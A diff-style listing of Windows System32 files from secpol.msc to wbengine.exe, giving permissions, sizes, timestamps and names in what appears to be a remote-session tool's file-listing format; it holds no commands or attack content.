+100666/rw-rw-rw-  120458     fil   2009-07-13 16:34:43 -0500  secpol.msc                                       
+100666/rw-rw-rw-  488448     fil   2017-07-14 11:21:36 -0500  secproc.dll                                      
+100666/rw-rw-rw-  485888     fil   2017-07-14 11:21:37 -0500  secproc_isv.dll                                  
+100666/rw-rw-rw-  123392     fil   2017-07-14 11:21:36 -0500  secproc_ssp.dll                                  
+100666/rw-rw-rw-  123392     fil   2017-07-14 11:21:36 -0500  secproc_ssp_isv.dll                              
+100666/rw-rw-rw-  28160      fil   2017-07-15 06:34:27 -0500  secur32.dll                                      
+100666/rw-rw-rw-  5120       fil   2009-07-13 18:50:18 -0500  security.dll                                     
+100666/rw-rw-rw-  69632      fil   2009-07-13 18:55:36 -0500  sendmail.dll                                     
+100666/rw-rw-rw-  29184      fil   2009-07-13 19:00:42 -0500  sensrsvc.dll                                     
+100666/rw-rw-rw-  17920      fil   2009-07-13 19:10:47 -0500  serialui.dll                                     
+100777/rwxrwxrwx  328704     fil   2017-07-14 11:24:03 -0500  services.exe                                     
+100666/rw-rw-rw-  92745      fil   2009-07-13 16:34:42 -0500  services.msc                                     
+100666/rw-rw-rw-  22528      fil   2009-07-13 19:10:48 -0500  serwvdrv.dll                                     
+100666/rw-rw-rw-  63488      fil   2017-07-15 06:34:27 -0500  setbcdlocale.dll                                 
+100777/rwxrwxrwx  279040     fil   2010-11-20 21:24:09 -0600  sethc.exe                                        
+100777/rwxrwxrwx  34816      fil   2009-07-13 18:50:58 -0500  setspn.exe                                       
+100666/rw-rw-rw-  1900544    fil   2010-11-20 21:24:28 -0600  setupapi.dll                                     
+100777/rwxrwxrwx  88576      fil   2010-11-20 21:23:48 -0600  setupcl.exe                                      
+100666/rw-rw-rw-  115712     fil   2009-07-13 18:28:35 -0500  setupcln.dll                                     
+100666/rw-rw-rw-  5120       fil   2009-07-13 18:30:58 -0500  setupetw.dll                                     
+100777/rwxrwxrwx  118272     fil   2009-07-13 18:28:32 -0500  setupugc.exe                                     
+100777/rwxrwxrwx  57856      fil   2009-07-13 18:25:40 -0500  setx.exe                                         
+100666/rw-rw-rw-  3072       fil   2009-07-13 18:25:52 -0500  sfc.dll                                          
+100777/rwxrwxrwx  39424      fil   2009-07-13 18:26:13 -0500  sfc.exe                                          
+100666/rw-rw-rw-  45056      fil   2009-07-13 18:26:05 -0500  sfc_os.dll                                       
+100666/rw-rw-rw-  135168     fil   2010-11-20 21:23:56 -0600  shacct.dll                                       
+100777/rwxrwxrwx  21504      fil   2010-11-20 21:24:41 -0600  shadow.exe                                       
+100666/rw-rw-rw-  357888     fil   2010-11-20 21:24:38 -0600  sharemediacpl.dll                                
+100666/rw-rw-rw-  197120     fil   2017-07-14 11:11:06 -0500  shdocvw.dll                                      
+100666/rw-rw-rw-  14183424   fil   2017-07-14 11:11:02 -0500  shell32.dll                                      
+100666/rw-rw-rw-  514048     fil   2009-07-13 18:54:43 -0500  shellstyle.dll                                   
+100666/rw-rw-rw-  10240      fil   2009-07-13 18:55:53 -0500  shfolder.dll                                     
+100666/rw-rw-rw-  28160      fil   2010-11-20 21:23:56 -0600  shgina.dll                                       
+100666/rw-rw-rw-  6656       fil   2017-07-14 11:18:47 -0500  shimeng.dll                                      
+100666/rw-rw-rw-  37376      fil   2010-11-20 21:24:28 -0600  shimgvw.dll                                      
+100666/rw-rw-rw-  448512     fil   2010-11-20 21:24:22 -0600  shlwapi.dll                                      
+100666/rw-rw-rw-  17920      fil   2009-07-13 18:55:38 -0500  shpafact.dll                                     
+100777/rwxrwxrwx  407552     fil   2009-07-13 18:48:20 -0500  shrpubw.exe                                      
+100666/rw-rw-rw-  130048     fil   2010-11-20 21:23:48 -0600  shsetup.dll                                      
+100666/rw-rw-rw-  370688     fil   2010-11-20 21:23:55 -0600  shsvcs.dll                                       
+100666/rw-rw-rw-  11264      fil   2010-11-20 21:24:01 -0600  shunimpl.dll                                     
+100777/rwxrwxrwx  34304      fil   2009-07-13 18:50:31 -0500  shutdown.exe                                     
+100666/rw-rw-rw-  451072     fil   2010-11-20 21:23:53 -0600  shwebsvc.dll                                     
+100666/rw-rw-rw-  54272      fil   2009-07-13 18:31:49 -0500  signdrv.dll                                      
+100777/rwxrwxrwx  74752      fil   2009-07-13 18:27:01 -0500  sigverif.exe                                     
+100666/rw-rw-rw-  12288      fil   2009-07-13 19:28:14 -0500  simpdata.tlb                                     
+100666/rw-rw-rw-  24064      fil   2010-11-20 21:24:08 -0600  sisbkup.dll                                      
+40777/rwxrwxrwx   0          dir   2009-07-13 22:20:13 -0500  sk-SK                                            
+40777/rwxrwxrwx   0          dir   2009-07-13 22:20:13 -0500  sl-SI                                            
+100666/rw-rw-rw-  30720      fil   2009-07-13 18:51:30 -0500  slc.dll                                          
+100666/rw-rw-rw-  18432      fil   2009-07-13 18:51:30 -0500  slcext.dll                                       
+40777/rwxrwxrwx   0          dir   2011-04-12 02:45:18 -0500  slmgr                                            
+100666/rw-rw-rw-  113629     fil   2009-06-10 15:59:12 -0500  slmgr.vbs                                        
+100777/rwxrwxrwx  349696     fil   2010-11-20 21:24:16 -0600  slui.exe                                         
+100666/rw-rw-rw-  15360      fil   2010-11-20 21:24:21 -0600  slwga.dll                                        
+100777/rwxrwxrwx  112640     fil   2017-07-15 06:34:27 -0500  smss.exe                                         
+100666/rw-rw-rw-  27648      fil   2009-07-13 19:10:31 -0500  snmpapi.dll                                      
+100777/rwxrwxrwx  14336      fil   2009-07-13 19:10:33 -0500  snmptrap.exe                                     
+100666/rw-rw-rw-  159232     fil   2009-07-13 18:39:09 -0500  softkbd.dll                                      
+100666/rw-rw-rw-  9216       fil   2009-07-13 18:49:13 -0500  softpub.dll                                      
+100777/rwxrwxrwx  22528      fil   2009-07-13 18:25:29 -0500  sort.exe                                         
+100666/rw-rw-rw-  78848      fil   2010-11-20 21:24:03 -0600  spbcd.dll                                        
+100666/rw-rw-rw-  8280       fil   2009-06-10 16:08:17 -0500  spcinstrumentation.man                           
+100666/rw-rw-rw-  13312      fil   2009-07-13 18:35:17 -0500  spcmsg.dll                                       
+100666/rw-rw-rw-  238592     fil   2009-07-13 18:35:17 -0500  sperror.dll                                      
+100666/rw-rw-rw-  97792      fil   2009-07-13 18:26:38 -0500  spfileq.dll                                      
+100777/rwxrwxrwx  598016     fil   2010-11-20 21:24:00 -0600  spinstall.exe                                    
+100666/rw-rw-rw-  10240      fil   2009-07-13 18:29:26 -0500  spnet.dll                                        
+40777/rwxrwxrwx   0          dir   2009-07-13 22:20:13 -0500  spool                                            
+100666/rw-rw-rw-  57856      fil   2009-07-13 19:39:20 -0500  spoolss.dll                                      
+100777/rwxrwxrwx  559104     fil   2010-11-20 21:24:27 -0600  spoolsv.exe                                      
+100666/rw-rw-rw-  18944      fil   2010-11-20 21:24:03 -0600  spopk.dll                                        
+40777/rwxrwxrwx   0          dir   2009-07-13 22:20:13 -0500  spp                                              
+100666/rw-rw-rw-  244224     fil   2010-11-20 21:25:06 -0600  spp.dll                                          
+100666/rw-rw-rw-  145920     fil   2010-11-20 21:24:24 -0600  sppc.dll                                         
+100666/rw-rw-rw-  413696     fil   2009-07-13 18:52:01 -0500  sppcc.dll                                        
+100666/rw-rw-rw-  1203712    fil   2009-07-13 18:52:11 -0500  sppcext.dll                                      
+100666/rw-rw-rw-  232448     fil   2010-11-20 21:24:16 -0600  sppcomapi.dll                                    
+100666/rw-rw-rw-  381952     fil   2009-07-13 18:51:58 -0500  sppcommdlg.dll                                   
+100666/rw-rw-rw-  113152     fil   2009-07-13 18:51:40 -0500  sppinst.dll                                      
+100666/rw-rw-rw-  102400     fil   2010-11-20 21:24:26 -0600  sppnp.dll                                        
+100666/rw-rw-rw-  1082880    fil   2010-11-20 21:24:15 -0600  sppobjs.dll                                      
+100777/rwxrwxrwx  3524608    fil   2010-11-20 21:23:56 -0600  sppsvc.exe                                       
+40777/rwxrwxrwx   0          dir   2009-07-13 22:20:13 -0500  sppui                                            
+100666/rw-rw-rw-  65536      fil   2009-07-13 18:52:07 -0500  sppuinotify.dll                                  
+100666/rw-rw-rw-  418816     fil   2010-11-20 21:23:51 -0600  sppwinob.dll                                     
+100666/rw-rw-rw-  142336     fil   2009-07-13 18:52:11 -0500  sppwmi.dll                                       
+100777/rwxrwxrwx  301568     fil   2010-11-20 21:24:00 -0600  spreview.exe                                     
+100666/rw-rw-rw-  13824      fil   2009-07-13 18:29:26 -0500  spwinsat.dll                                     
+100666/rw-rw-rw-  445952     fil   2010-11-20 21:24:03 -0600  spwizeng.dll                                     
+100666/rw-rw-rw-  8338432    fil   2009-07-13 18:29:20 -0500  spwizimg.dll                                     
+100666/rw-rw-rw-  7680       fil   2010-11-20 21:24:03 -0600  spwizres.dll                                     
+100666/rw-rw-rw-  263168     fil   2010-11-20 21:24:00 -0600  spwizui.dll                                      
+100666/rw-rw-rw-  9728       fil   2010-11-20 21:24:52 -0600  spwmp.dll                                        
+100666/rw-rw-rw-  195072     fil   2009-07-13 19:22:24 -0500  sqlceoledb30.dll                                 
+100666/rw-rw-rw-  843776     fil   2009-07-13 19:23:06 -0500  sqlceqp30.dll                                    
+100666/rw-rw-rw-  446976     fil   2010-11-20 21:24:08 -0600  sqlcese30.dll                                    
+100666/rw-rw-rw-  933888     fil   2010-11-20 21:23:51 -0600  sqlsrv32.dll                                     
+100666/rw-rw-rw-  106496     fil   2009-07-13 19:28:44 -0500  sqlsrv32.rll                                     
+100666/rw-rw-rw-  244736     fil   2010-11-20 21:23:52 -0600  sqmapi.dll                                       
+40777/rwxrwxrwx   4096       dir   2009-07-13 22:20:13 -0500  sr-Latn-CS                                       
+100666/rw-rw-rw-  340992     fil   2010-11-20 21:25:09 -0600  srchadmin.dll                                    
+100666/rw-rw-rw-  50176      fil   2017-07-15 06:34:27 -0500  srclient.dll                                     
+100666/rw-rw-rw-  503808     fil   2017-07-15 06:34:28 -0500  srcore.dll                                       
+100777/rwxrwxrwx  18944      fil   2009-07-13 18:36:26 -0500  srdelayed.exe                                    
+100666/rw-rw-rw-  86528      fil   2009-07-13 18:36:23 -0500  srhelper.dll                                     
+100666/rw-rw-rw-  270848     fil   2010-11-20 21:25:06 -0600  srrstr.dll                                       
+100666/rw-rw-rw-  128000     fil   2010-11-20 21:24:03 -0600  srvcli.dll                                       
+100666/rw-rw-rw-  236032     fil   2010-11-20 21:23:48 -0600  srvsvc.dll                                       
+100666/rw-rw-rw-  26624      fil   2009-07-13 18:36:24 -0500  srwmi.dll                                        
+100666/rw-rw-rw-  333824     fil   2010-11-20 21:24:51 -0600  ssText3d.scr                                     
+100666/rw-rw-rw-  13312      fil   2010-11-20 21:23:48 -0600  sscore.dll                                       
+100666/rw-rw-rw-  51200      fil   2009-07-13 19:10:51 -0500  ssdpapi.dll                                      
+100666/rw-rw-rw-  193024     fil   2009-07-13 19:10:57 -0500  ssdpsrv.dll                                      
+100666/rw-rw-rw-  135680     fil   2017-07-15 06:34:27 -0500  sspicli.dll                                      
+100666/rw-rw-rw-  28672      fil   2017-07-15 06:34:27 -0500  sspisrv.dll                                      
+100666/rw-rw-rw-  75264      fil   2009-07-13 19:10:25 -0500  sstpsvc.dll                                      
+100666/rw-rw-rw-  66560      fil   2009-07-13 18:59:33 -0500  stclient.dll                                     
+100666/rw-rw-rw-  16896      fil   2009-07-13 18:59:15 -0500  stdole2.tlb                                      
+100666/rw-rw-rw-  7168       fil   2009-06-10 15:47:40 -0500  stdole32.tlb                                     
+100666/rw-rw-rw-  292352     fil   2009-07-13 19:35:45 -0500  sti.dll                                          
+100666/rw-rw-rw-  149504     fil   2009-07-13 19:35:35 -0500  sti_ci.dll                                       
+100666/rw-rw-rw-  257024     fil   2010-11-20 21:24:07 -0600  stobject.dll                                     
+100666/rw-rw-rw-  24144      fil   2009-07-13 19:18:29 -0500  streamci.dll                                     
+100777/rwxrwxrwx  15360      fil   2009-07-13 18:25:29 -0500  subst.exe                                        
+100666/rw-rw-rw-  769536     fil   2010-11-20 21:24:08 -0600  sud.dll                                          
+40777/rwxrwxrwx   4096       dir   2009-07-13 22:20:13 -0500  sv-SE                                            
+100777/rwxrwxrwx  27136      fil   2009-07-13 18:31:13 -0500  svchost.exe                                      
+100666/rw-rw-rw-  524288     fil   2009-07-13 18:37:06 -0500  swprv.dll                                        
+100666/rw-rw-rw-  75776      fil   2009-07-13 18:36:14 -0500  sxproxy.dll                                      
+100666/rw-rw-rw-  582656     fil   2010-11-20 21:24:08 -0600  sxs.dll                                          
+100666/rw-rw-rw-  42496      fil   2009-07-13 18:36:18 -0500  sxshared.dll                                     
+100666/rw-rw-rw-  31744      fil   2009-07-13 18:26:22 -0500  sxssrv.dll                                       
+100666/rw-rw-rw-  27136      fil   2009-07-13 18:26:21 -0500  sxsstore.dll                                     
+100777/rwxrwxrwx  35328      fil   2009-07-13 18:26:37 -0500  sxstrace.exe                                     
+100666/rw-rw-rw-  95744      fil   2017-07-14 11:11:03 -0500  synceng.dll                                      
+100666/rw-rw-rw-  200192     fil   2010-11-20 21:24:51 -0600  syncui.dll                                       
+100666/rw-rw-rw-  207360     fil   2010-11-20 21:24:26 -0600  sysclass.dll                                     
+100666/rw-rw-rw-  352768     fil   2010-11-20 21:24:09 -0600  sysdm.cpl                                        
+100777/rwxrwxrwx  33792      fil   2009-07-13 18:50:52 -0500  syskey.exe                                       
+100666/rw-rw-rw-  1743360    fil   2017-07-14 11:26:08 -0500  sysmain.dll                                      
+100666/rw-rw-rw-  474112     fil   2010-11-20 21:24:19 -0600  sysmon.ocx                                       
+100666/rw-rw-rw-  23040      fil   2009-07-13 18:52:25 -0500  sysntfy.dll                                      
+40777/rwxrwxrwx   0          dir   2009-07-13 22:20:13 -0500  sysprep                                          
+100666/rw-rw-rw-  9216       fil   2009-07-13 19:25:04 -0500  sysprepMCE.dll                                   
+100666/rw-rw-rw-  3214       fil   2009-06-10 16:01:15 -0500  sysprint.sep                                     
+100666/rw-rw-rw-  3577       fil   2009-07-13 18:16:33 -0500  sysprtj.sep                                      
+100666/rw-rw-rw-  17408      fil   2010-11-20 21:24:16 -0600  syssetup.dll                                     
+100666/rw-rw-rw-  419840     fil   2010-11-20 21:24:08 -0600  systemcpl.dll                                    
+100777/rwxrwxrwx  110592     fil   2009-07-13 19:13:01 -0500  systeminfo.exe                                   
+100666/rw-rw-rw-  347904     fil   2010-11-20 21:24:36 -0600  systemsf.ebd                                     
+100777/rwxrwxrwx  9216       fil   2009-07-13 18:55:54 -0500  systray.exe                                      
+100666/rw-rw-rw-  148992     fil   2010-11-20 21:23:56 -0600  t2embed.dll                                      
+100777/rwxrwxrwx  78848      fil   2010-11-20 21:24:33 -0600  tabcal.exe                                       
+100777/rwxrwxrwx  63488      fil   2010-11-20 21:23:55 -0600  takeown.exe                                      
+100666/rw-rw-rw-  985088     fil   2009-07-13 19:41:14 -0500  tapi3.dll                                        
+100666/rw-rw-rw-  248832     fil   2009-07-13 19:41:12 -0500  tapi32.dll                                       
+100666/rw-rw-rw-  35328      fil   2009-07-13 19:40:52 -0500  tapilua.dll                                      
+100666/rw-rw-rw-  11264      fil   2009-07-13 19:40:56 -0500  tapiperf.dll                                     
+100666/rw-rw-rw-  316928     fil   2010-11-20 21:24:32 -0600  tapisrv.dll                                      
+100666/rw-rw-rw-  108544     fil   2009-07-13 19:41:05 -0500  tapiui.dll                                       
+100666/rw-rw-rw-  243712     fil   2010-11-20 21:24:00 -0600  taskbarcpl.dll                                   
+100666/rw-rw-rw-  473600     fil   2010-11-20 21:24:32 -0600  taskcomp.dll                                     
+100777/rwxrwxrwx  464384     fil   2010-11-20 21:24:27 -0600  taskeng.exe                                      
+100777/rwxrwxrwx  68608      fil   2017-07-14 11:10:42 -0500  taskhost.exe                                     
+100777/rwxrwxrwx  112640     fil   2009-07-13 19:13:06 -0500  taskkill.exe                                     
+100777/rwxrwxrwx  108544     fil   2009-07-13 19:13:02 -0500  tasklist.exe                                     
+100777/rwxrwxrwx  257024     fil   2010-11-20 21:24:24 -0600  taskmgr.exe                                      
+100666/rw-rw-rw-  1197056    fil   2010-11-20 21:24:16 -0600  taskschd.dll                                     
+100666/rw-rw-rw-  145059     fil   2009-07-13 16:36:47 -0500  taskschd.msc                                     
+100666/rw-rw-rw-  20480      fil   2017-07-14 11:22:38 -0500  tbs.dll                                          
+100777/rwxrwxrwx  15360      fil   2009-07-13 19:40:53 -0500  tcmsetup.exe                                     
+100666/rw-rw-rw-  1041       fil   2009-06-10 16:01:24 -0500  tcpbidi.xml                                      
+100666/rw-rw-rw-  253440     fil   2010-11-20 21:24:15 -0600  tcpipcfg.dll                                     
+100666/rw-rw-rw-  38912      fil   2009-07-13 19:39:13 -0500  tcpmib.dll                                       
+100666/rw-rw-rw-  195072     fil   2009-07-13 19:39:27 -0500  tcpmon.dll                                       
+100666/rw-rw-rw-  60124      fil   2009-06-10 16:01:25 -0500  tcpmon.ini                                       
+100666/rw-rw-rw-  73216      fil   2009-07-13 19:39:20 -0500  tcpmonui.dll                                     
+100666/rw-rw-rw-  77312      fil   2017-07-14 13:04:30 -0500  tdc.ocx                                          
+100666/rw-rw-rw-  879104     fil   2017-07-14 11:19:12 -0500  tdh.dll                                          
+100666/rw-rw-rw-  108032     fil   2009-07-13 19:40:56 -0500  telephon.cpl                                     
+100666/rw-rw-rw-  421888     fil   2010-11-20 21:24:20 -0600  termmgr.dll                                      
+100666/rw-rw-rw-  683520     fil   2017-07-14 11:23:46 -0500  termsrv.dll                                      
+40777/rwxrwxrwx   0          dir   2009-07-13 22:20:13 -0500  th-TH                                            
+100666/rw-rw-rw-  318464     fil   2009-07-13 19:27:57 -0500  thawbrkr.dll                                     
+100666/rw-rw-rw-  2193920    fil   2010-11-20 21:23:53 -0600  themecpl.dll                                     
+100666/rw-rw-rw-  44544      fil   2009-07-13 18:54:46 -0500  themeservice.dll                                 
+100666/rw-rw-rw-  2851840    fil   2010-11-20 21:23:55 -0600  themeui.dll                                      
+100666/rw-rw-rw-  112640     fil   2010-11-20 21:23:55 -0600  thumbcache.dll                                   
+100666/rw-rw-rw-  1988       fil   2009-07-13 21:34:28 -0500  ticrf.rat                                        
+100666/rw-rw-rw-  515584     fil   2017-07-14 11:22:46 -0500  timedate.cpl                                     
+100777/rwxrwxrwx  33280      fil   2009-07-13 18:25:38 -0500  timeout.exe                                      
+100666/rw-rw-rw-  176128     fil   2009-07-13 18:39:42 -0500  tintlgnt.ime                                     
+100666/rw-rw-rw-  73728      fil   2010-11-20 21:24:01 -0600  tlscsp.dll                                       
+100666/rw-rw-rw-  144862     fil   2009-07-13 16:05:46 -0500  tpm.msc                                          
+100666/rw-rw-rw-  42496      fil   2009-07-13 18:21:46 -0500  tpmcompc.dll                                     
+100666/rw-rw-rw-  2315776    fil   2017-07-14 11:23:16 -0500  tquery.dll                                       
+40777/rwxrwxrwx   4096       dir   2009-07-13 22:20:13 -0500  tr-TR                                            
+100777/rwxrwxrwx  404992     fil   2017-07-14 11:26:39 -0500  tracerpt.exe                                     
+100666/rw-rw-rw-  39424      fil   2009-07-13 19:09:46 -0500  traffic.dll                                      
+100777/rwxrwxrwx  18944      fil   2009-07-13 18:25:27 -0500  tree.com                                         
+100666/rw-rw-rw-  119808     fil   2009-07-13 18:59:25 -0500  trkwks.dll                                       
+100666/rw-rw-rw-  14848      fil   2010-11-20 21:24:24 -0600  tsbyuv.dll                                       
+100666/rw-rw-rw-  200192     fil   2010-11-20 21:24:41 -0600  tscfgwmi.dll                                     
+100777/rwxrwxrwx  22528      fil   2010-11-20 21:24:41 -0600  tscon.exe                                        
+100666/rw-rw-rw-  17408      fil   2009-07-13 19:16:34 -0500  tsddd.dll                                        
+100777/rwxrwxrwx  22016      fil   2010-11-20 21:24:41 -0600  tsdiscon.exe                                     
+100666/rw-rw-rw-  44032      fil   2017-07-14 11:23:28 -0500  tsgqec.dll                                       
+100777/rwxrwxrwx  23552      fil   2010-11-20 21:24:41 -0600  tskill.exe                                       
+100666/rw-rw-rw-  299520     fil   2010-11-20 21:24:35 -0600  tsmf.dll                                         
+100666/rw-rw-rw-  34816      fil   2009-07-13 19:20:21 -0500  tvratings.dll                                    
+100666/rw-rw-rw-  172544     fil   2010-11-20 21:24:16 -0600  twext.dll                                        
+100666/rw-rw-rw-  119296     fil   2009-07-13 18:59:35 -0500  txflog.dll                                       
+100666/rw-rw-rw-  11776      fil   2009-07-13 18:19:38 -0500  txfw32.dll                                       
+100777/rwxrwxrwx  47104      fil   2017-07-14 11:26:39 -0500  typeperf.exe                                     
+100666/rw-rw-rw-  2048       fil   2010-11-20 21:23:53 -0600  tzres.dll                                        
+100777/rwxrwxrwx  58368      fil   2010-11-20 21:23:52 -0600  tzutil.exe                                       
+100666/rw-rw-rw-  328704     fil   2009-07-13 18:37:45 -0500  uDWM.dll                                         
+100666/rw-rw-rw-  215552     fil   2017-07-14 11:22:11 -0500  ubpm.dll                                         
+100666/rw-rw-rw-  57856      fil   2009-07-13 19:08:15 -0500  ucmhc.dll                                        
+100777/rwxrwxrwx  41984      fil   2009-07-13 18:22:24 -0500  ucsvc.exe                                        
+100666/rw-rw-rw-  53248      fil   2009-07-13 19:10:51 -0500  udhisapi.dll                                     
+100666/rw-rw-rw-  87040      fil   2009-07-13 18:25:05 -0500  uexfat.dll                                       
+100666/rw-rw-rw-  126976     fil   2009-07-13 18:25:07 -0500  ufat.dll                                         
+100666/rw-rw-rw-  42496      fil   2009-07-13 19:10:48 -0500  uicom.dll                                        
+40777/rwxrwxrwx   0          dir   2009-07-13 22:20:13 -0500  uk-UA                                            
+100666/rw-rw-rw-  146944     fil   2009-07-13 18:25:05 -0500  ulib.dll                                         
+100666/rw-rw-rw-  59904      fil   2010-11-20 21:23:55 -0600  umb.dll                                          
+100666/rw-rw-rw-  20480      fil   2009-07-13 19:10:47 -0500  umdmxfrm.dll                                     
+100666/rw-rw-rw-  404480     fil   2017-07-14 11:10:30 -0500  umpnpmgr.dll                                     
+100666/rw-rw-rw-  163840     fil   2009-07-13 18:27:49 -0500  umpo.dll                                         
+100666/rw-rw-rw-  214528     fil   2010-11-20 21:25:07 -0600  umrdp.dll                                        
+100666/rw-rw-rw-  18432      fil   2009-07-13 23:45:37 -0500  umstartup.etl                                    
+100666/rw-rw-rw-  46080      fil   2009-07-13 23:45:37 -0500  umstartup000.etl                                 
+100666/rw-rw-rw-  248832     fil   2009-07-13 18:28:13 -0500  unattend.dll                                     
+100666/rw-rw-rw-  321536     fil   2010-11-20 21:24:28 -0600  unimdm.tsp                                       
+100666/rw-rw-rw-  73216      fil   2010-11-20 21:24:03 -0600  unimdmat.dll                                     
+100666/rw-rw-rw-  23040      fil   2009-07-13 19:10:49 -0500  uniplat.dll                                      
+100777/rwxrwxrwx  40448      fil   2009-07-13 18:31:22 -0500  unlodctr.exe                                     
+100777/rwxrwxrwx  323584     fil   2009-07-13 19:23:56 -0500  unregmp2.exe                                     
+100666/rw-rw-rw-  403968     fil   2010-11-20 21:23:48 -0600  untfs.dll                                        
+100666/rw-rw-rw-  264192     fil   2010-11-20 21:24:01 -0600  upnp.dll                                         
+100777/rwxrwxrwx  25600      fil   2009-07-13 19:10:51 -0500  upnpcont.exe                                     
+100666/rw-rw-rw-  353792     fil   2009-07-13 19:11:06 -0500  upnphost.dll                                     
+100666/rw-rw-rw-  29184      fil   2009-07-13 18:24:50 -0500  ureg.dll                                         
+100666/rw-rw-rw-  235520     fil   2017-07-14 13:04:30 -0500  url.dll                                          
+100666/rw-rw-rw-  1545728    fil   2017-07-14 13:04:31 -0500  urlmon.dll                                       
+100666/rw-rw-rw-  27648      fil   2009-07-13 19:06:34 -0500  usbceip.dll                                      
+100666/rw-rw-rw-  45056      fil   2009-07-13 19:39:22 -0500  usbmon.dll                                       
+100666/rw-rw-rw-  13312      fil   2009-07-13 19:06:28 -0500  usbperf.dll                                      
+100666/rw-rw-rw-  101376     fil   2009-07-13 18:56:47 -0500  usbui.dll                                        
+100666/rw-rw-rw-  1008128    fil   2010-11-20 21:24:09 -0600  user32.dll                                       
+100666/rw-rw-rw-  625664     fil   2010-11-20 21:24:03 -0600  usercpl.dll                                      
+100666/rw-rw-rw-  109056     fil   2010-11-20 21:24:03 -0600  userenv.dll                                      
+100777/rwxrwxrwx  30720      fil   2010-11-20 21:24:28 -0600  userinit.exe                                     
+100666/rw-rw-rw-  30720      fil   2017-07-14 11:20:06 -0500  usk.rs                                           
+100666/rw-rw-rw-  800256     fil   2010-11-20 21:24:08 -0600  usp10.dll                                        
+100666/rw-rw-rw-  34816      fil   2009-07-13 19:17:00 -0500  utildll.dll                                      
+100666/rw-rw-rw-  169472     fil   2009-07-13 18:25:08 -0500  uudf.dll                                         
+100666/rw-rw-rw-  154624     fil   2010-11-20 21:24:03 -0600  uxlib.dll                                        
+100666/rw-rw-rw-  2560       fil   2009-07-13 18:29:22 -0500  uxlibres.dll                                     
+100666/rw-rw-rw-  38912      fil   2009-07-13 18:37:36 -0500  uxsms.dll                                        
+100666/rw-rw-rw-  332288     fil   2009-07-13 18:55:29 -0500  uxtheme.dll                                      
+100666/rw-rw-rw-  41984      fil   2009-07-13 18:52:55 -0500  vaultcli.dll                                     
+100666/rw-rw-rw-  374272     fil   2009-07-13 18:53:24 -0500  vaultsvc.dll                                     
+100666/rw-rw-rw-  43520      fil   2010-11-20 21:24:51 -0600  vbisurf.ax                                       
+100666/rw-rw-rw-  584192     fil   2017-07-14 13:04:30 -0500  vbscript.dll                                     
+100777/rwxrwxrwx  533504     fil   2010-11-20 21:23:51 -0600  vds.exe                                          
+100666/rw-rw-rw-  116736     fil   2009-07-13 18:36:30 -0500  vds_ps.dll                                       
+100666/rw-rw-rw-  190976     fil   2010-11-20 21:24:09 -0600  vdsbas.dll                                       
+100666/rw-rw-rw-  582656     fil   2009-07-13 18:36:43 -0500  vdsdyn.dll                                       
+100777/rwxrwxrwx  22528      fil   2009-07-13 18:36:41 -0500  vdsldr.exe                                       
+100666/rw-rw-rw-  185856     fil   2010-11-20 21:23:51 -0600  vdsutil.dll                                      
+100666/rw-rw-rw-  55296      fil   2009-07-13 18:36:50 -0500  vdsvd.dll                                        
+100777/rwxrwxrwx  11776      fil   2009-07-13 18:57:39 -0500  verclsid.exe                                     
+100666/rw-rw-rw-  374784     fil   2009-07-13 18:35:31 -0500  verifier.dll                                     
+100777/rwxrwxrwx  155648     fil   2009-07-13 19:15:00 -0500  verifier.exe                                     
+100666/rw-rw-rw-  29184      fil   2009-07-13 18:57:24 -0500  version.dll                                      
+100666/rw-rw-rw-  68096      fil   2010-11-20 21:24:00 -0600  vfwwdm32.dll                                     
+100666/rw-rw-rw-  15360      fil   2009-07-13 18:38:48 -0500  vga.dll                                          
+100666/rw-rw-rw-  28672      fil   2009-07-13 19:06:36 -0500  vidcap.ax                                        
+100666/rw-rw-rw-  21504      fil   2009-07-13 18:25:51 -0500  virtdisk.dll                                     
+100666/rw-rw-rw-  113112     fil   2017-05-12 11:16:32 -0500  vm3ddevapi64.dll                                 
+100666/rw-rw-rw-  19044824   fil   2017-05-12 11:16:32 -0500  vm3dgl64.dll                                     
+100666/rw-rw-rw-  362456     fil   2017-05-12 11:16:30 -0500  vm3dum64.dll                                     
+100666/rw-rw-rw-  217552     fil   2017-05-12 11:16:30 -0500  vm3dum64_10.dll                                  
+100666/rw-rw-rw-  393192     fil   2017-05-12 11:13:28 -0500  vmGuestLib.dll                                   
+100666/rw-rw-rw-  48616      fil   2017-05-12 11:13:26 -0500  vmGuestLibJava.dll                               
+100666/rw-rw-rw-  15872      fil   2011-04-12 02:51:11 -0500  vmbuspipe.dll                                    
+100666/rw-rw-rw-  44544      fil   2011-04-12 02:51:11 -0500  vmbusres.dll                                     
+100666/rw-rw-rw-  53760      fil   2011-04-12 02:51:11 -0500  vmicres.dll                                      
+100777/rwxrwxrwx  244224     fil   2011-04-12 02:51:11 -0500  vmicsvc.exe                                      
+100666/rw-rw-rw-  51712      fil   2011-04-12 02:51:11 -0500  vmictimeprovider.dll                             
+100666/rw-rw-rw-  38400      fil   2011-04-12 02:51:10 -0500  vmstorfltres.dll                                 
+100666/rw-rw-rw-  263168     fil   2010-11-20 21:24:16 -0600  vpnike.dll                                       
+100666/rw-rw-rw-  38912      fil   2010-11-20 21:23:48 -0600  vpnikeapi.dll                                    
+100666/rw-rw-rw-  69104      fil   2017-12-23 20:23:10 -0600  vsocklib.dll                                     
+100666/rw-rw-rw-  61952      fil   2010-11-20 21:24:00 -0600  vss_ps.dll                                       
+100777/rwxrwxrwx  167424     fil   2009-07-13 18:37:02 -0500  vssadmin.exe                                     
+100666/rw-rw-rw-  1753088    fil   2010-11-20 21:24:14 -0600  vssapi.dll                                       
+100666/rw-rw-rw-  76800      fil   2009-07-13 18:36:56 -0500  vsstrace.dll                                     
+100666/rw-rw-rw-  381952     fil   2009-07-13 18:49:52 -0500  w32time.dll                                      
+100777/rwxrwxrwx  81408      fil   2009-07-13 18:49:41 -0500  w32tm.exe                                        
+100666/rw-rw-rw-  35328      fil   2009-07-13 18:53:40 -0500  w32topl.dll                                      
+100777/rwxrwxrwx  44544      fil   2009-07-13 18:25:39 -0500  waitfor.exe                                      
+100666/rw-rw-rw-  255488     fil   2010-11-20 21:24:15 -0600  wavemsp.dll                                      
+100777/rwxrwxrwx  265728     fil   2009-07-13 18:36:15 -0500  wbadmin.exe                                      
+40777/rwxrwxrwx   65536      dir   2009-07-13 22:20:14 -0500  wbem                                             
+100666/rw-rw-rw-  529408     fil   2010-11-20 21:23:56 -0600  wbemcomn.dll                                     
+100777/rwxrwxrwx  1504256    fil   2010-11-20 21:25:14 -0600  wbengine.exe                                     
